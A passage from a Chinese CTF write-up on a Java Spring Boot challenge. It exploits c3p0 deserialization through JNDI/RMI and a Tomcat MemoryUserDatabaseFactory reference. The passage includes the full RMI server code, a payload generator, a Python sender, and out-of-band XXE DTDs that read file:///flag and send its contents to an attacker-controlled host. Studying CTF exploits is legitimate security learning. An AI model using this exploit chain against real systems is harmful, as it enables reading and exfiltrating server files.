</span></span><span style="display:flex;"><span>        InitialContext initialContext<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">env</span> <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          initialContext <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> InitialContext<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          initialContext <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> InitialContext<span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">env</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> 
</span></span><span style="display:flex;"><span>        Context context <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">contextName</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>          context <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Context<span style="color:#ff79c6">)</span>initialContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lookup</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">contextName</span><span style="color:#ff79c6">);</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ReferenceableUtils<span style="color:#ff79c6">.</span><span style="color:#50fa7b">referenceToObject</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">reference</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">name</span><span style="color:#ff79c6">,</span> context<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">env</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>NamingException namingException<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>ReferenceIndirector<span style="color:#ff79c6">.</span><span style="color:#50fa7b">logger</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">isLoggable</span><span style="color:#ff79c6">(</span>MLevel<span style="color:#ff79c6">.</span><span style="color:#50fa7b">WARNING</span><span style="color:#ff79c6">))</span>
</span></span><span style="display:flex;"><span>          ReferenceIndirector<span style="color:#ff79c6">.</span><span style="color:#50fa7b">logger</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">log</span><span style="color:#ff79c6">(</span>MLevel<span style="color:#ff79c6">.</span><span style="color:#50fa7b">WARNING</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;Failed to acquire the Context necessary to lookup an Object.&#34;</span><span style="color:#ff79c6">,</span> namingException<span style="color:#ff79c6">);</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> InvalidObjectException<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Failed to acquire the Context necessary to lookup an Object: &#34;</span> <span style="color:#ff79c6">+</span> namingException<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>可以jndi注入。但这里有个小问题，在writeObject过程中会设置这个reference</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">public</span> IndirectlySerialized <span style="color:#50fa7b">indirectForm</span><span style="color:#ff79c6">(</span>Object paramObject<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Reference reference <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">((</span>Referenceable<span style="color:#ff79c6">)</span>paramObject<span style="color:#ff79c6">).</span><span style="color:#50fa7b">getReference</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> ReferenceSerialized<span style="color:#ff79c6">(</span>reference<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">name</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">contextName</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">environmentProperties</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>所以要重写。由于比较菜不会写QwQ，我直接把jar包里的这个类删掉自己按照包名写了一个，就可以控制reference=null和控制contextName了</p>
<p>contextName是个Name类型，Name是个接口。而且，ldap被waf ban了。找了一下实现类+一番搜索发现javax.naming.CompoundName可以用</p>
<p><a href="https://www.jianshu.com/p/d55425bdf4f2">https://www.jianshu.com/p/d55425bdf4f2</a></p>
<p>把com.mchange.v2.naming.ReferenceIndirector#IndirectlySerialized改成这个</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> IndirectlySerialized <span style="color:#50fa7b">indirectForm</span><span style="color:#ff79c6">(</span>Object paramObject<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Properties pros<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> Properties<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            Name name<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> CompoundName<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;rmi://ip:1234/Evil&#34;</span><span style="color:#ff79c6">,</span>pros<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> ReferenceSerialized<span style="color:#ff79c6">(</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span> name<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">environmentProperties</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>用marshalsec打了一下发现不行，因为jdk是高版本</p>
<p><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p>
<p>由于是springboot，本来可以用BeanFactory调ELProcessor，但是又有个waf</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>      <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">el</span><span style="color:#ff79c6">(</span>Instrumentation inst<span style="color:#ff79c6">,</span> ClassLoader loader<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Class<span style="color:#ff79c6">&lt;?&gt;</span> elProcessorClass <span style="color:#ff79c6">=</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;javax.el.ELProcessor&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">,</span> loader<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ClassPool classPool <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ClassPool<span style="color:#ff79c6">(</span><span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">((</span>ClassPath<span style="color:#ff79c6">)</span><span style="color:#ff79c6">new</span> ClassClassPath<span style="color:#ff79c6">(</span>elProcessorClass<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>        classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertClassPath</span><span style="color:#ff79c6">((</span>ClassPath<span style="color:#ff79c6">)</span><span style="color:#ff79c6">new</span> LoaderClassPath<span style="color:#ff79c6">(</span>elProcessorClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getClassLoader</span><span style="color:#ff79c6">()));</span>
</span></span><span style="display:flex;"><span>        CtClass ctClass <span style="color:#ff79c6">=</span> classPool<span style="color:#ff79c6">.</span><span style="color:#50fa7b">get</span><span style="color:#ff79c6">(</span>elProcessorClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span>        CtMethod ctMethod <span style="color:#ff79c6">=</span> ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMethod</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;eval&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;(Ljava/lang/String;)Ljava/lang/Object;&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ctMethod<span style="color:#ff79c6">.</span><span style="color:#50fa7b">insertBefore</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">.</span><span style="color:#50fa7b">format</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34; if (expression!=null){\n            return null;\n        }&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> Object<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> AgentDemo<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span>
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">.</span><span style="color:#50fa7b">getName</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">}));</span>
</span></span><span style="display:flex;"><span>        inst<span style="color:#ff79c6">.</span><span style="color:#50fa7b">redefineClasses</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> ClassDefinition<span style="color:#ff79c6">[]</span> <span style="color:#ff79c6">{</span> <span style="color:#ff79c6">new</span> ClassDefinition<span style="color:#ff79c6">(</span>elProcessorClass<span style="color:#ff79c6">,</span> ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span>        ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">detach</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ctClass<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toBytecode</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>暂时想不到怎么绕。。</p>
<p>搜到了一篇文章</p>
<p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#22--orgapachecatalinausersmemoryuserdatabasefactory">https://www.cnblogs.com/bitterz/p/15946406.html#22--orgapachecatalinausersmemoryuserdatabasefactory</a></p>
<p>里面的方法都看了一下，org.apache.catalina.users.MemoryUserDatabaseFactory似乎能用，可以XXE</p>
<p>写一个rmi Server</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#ff79c6">package</span> com.example.idea<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> org.apache.naming.ResourceRef<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> javax.naming.StringRefAddr<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.rmi.registry.LocateRegistry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.rmi.registry.Registry<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Server</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//    javax.el.ELProcessor
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Registry registry <span style="color:#ff79c6">=</span> LocateRegistry<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createRegistry</span><span style="color:#ff79c6">(</span>1234<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            ResourceRef ref<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> ResourceRef<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;org.apache.catalina.UserDatabase&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;org.apache.catalina.users.MemoryUserDatabaseFactory&#34;</span><span style="color:#ff79c6">,</span><span style="color:#ff79c6">null</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//        ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=createDirectory&#34;));
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            ref<span style="color:#ff79c6">.</span><span style="color:#50fa7b">add</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> StringRefAddr<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;pathname&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;http://ip/post.xml&#34;</span><span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>            ReferenceWrapper referenceWrapper <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ReferenceWrapper<span style="color:#ff79c6">(</span>ref<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            registry<span style="color:#ff79c6">.</span><span style="color:#50fa7b">bind</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Evil&#34;</span><span style="color:#ff79c6">,</span> referenceWrapper<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>nginx服务放上两个xml</p>
<p>post.xml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!DOCTYPE roottag[
</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">    &lt;!ENTITY % dtd SYSTEM &#34;http://ip/exp.xml&#34;&gt;</span>
</span></span><span style="display:flex;"><span>    %dtd;
</span></span><span style="display:flex;"><span>    %int;
</span></span><span style="display:flex;"><span>    %send;
</span></span><span style="display:flex;"><span>    ]&gt;
</span></span></code></pre></div><p>exp.xml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!ENTITY % file SYSTEM &#34;file:///flag&#34;&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;!ENTITY % int &#34;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip/%file;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><p>但是rmi server换成远程就打不通。docker看看logs，发现已经查询了rmi，但是报错</p>
<p>Connection refused to host: 127.0.1.1</p>
<p>搜索一番，发现是这个原因</p>
<p><a href="https://zhuanlan.zhihu.com/p/41806870">https://zhuanlan.zhihu.com/p/41806870</a></p>
<p>Server加一句</p>
<p><code>System.setProperty(&quot;java.rmi.server.hostname&quot;,&quot;远程Ip&quot;);</code></p>
<p>就行了。</p>
<p>生成base64</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#ff79c6">package</span> com.example.idea<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> com.mchange.v2.c3p0.PoolBackedDataSource<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> com.mchange.v2.naming.ReferenceIndirector<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> com.mchange.v2.ser.IndirectlySerialized<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> javax.naming.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> javax.sql.ConnectionPoolDataSource<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> javax.sql.PooledConnection<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.sql.SQLException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.sql.SQLFeatureNotSupportedException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.util.Enumeration<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.util.Properties<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.util.logging.Logger<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Test</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//        com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">//        Name name=new CompoundName(&#34;rmi://127.0.0.1:1234/Evil&#34;,pros);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            PoolBackedDataSource b <span style="color:#ff79c6">=</span> Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createWithoutConstructor</span><span style="color:#ff79c6">(</span>PoolBackedDataSource<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//        Reflections.getField(PoolBackedDataSourceBase.class, &#34;connectionPoolDataSource&#34;).set(b, new PoolSource(className, url));
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#6272a4">//        javax.el.ELProcessor
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bb<span style="color:#ff79c6">=</span>serialize<span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>bb<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>            deserialize<span style="color:#ff79c6">(</span>bb<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">//        org.yaml.snakeyaml.Yaml
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> <span style="color:#50fa7b">serialize</span><span style="color:#ff79c6">(</span>Object o<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                ByteArrayOutputStream aos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>                ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>aos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>o<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>                oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> aos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">deserialize</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                ByteArrayInputStream ais <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>ais<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>                ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>                ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>vps起上Server，然后发包</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>    url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://127.0.0.1:49153/ctf&#34;</span>
</span></span><span style="display:flex;"><span>    url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://6442e76d-f89c-41cc-8a86-611f8afddc67.node4.buuoj.cn:81/ctf&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pwn</span>(pay):
</span></span><span style="display:flex;"><span>        r<span style="color:#ff79c6">=</span>requests<span style="color:#ff79c6">.</span>post(url,data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;data&#34;</span>:pay})
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>text)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>        pay<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;base64&#34;</span>
</span></span><span style="display:flex;"><span>        pwn(pay)
</span></span></code></pre></div><p>看看logs即可收到flag</p>
<p>但是预期解要RCE，官方wp给的是<code>new org.yaml.snakeyaml.Yaml().load(String)</code>
<a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p>

        </p>
    </div>
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#mini-l-ctf-2022-minispringboot">Mini-L-CTF-2022 minispringboot</a></li>
    <li><a href="#mini-l-ctf-2022-mini-struts2">Mini-L-CTF-2022 Mini Struts2</a></li>
    <li><a href="#车联网ezcc">车联网ezcc</a></li>
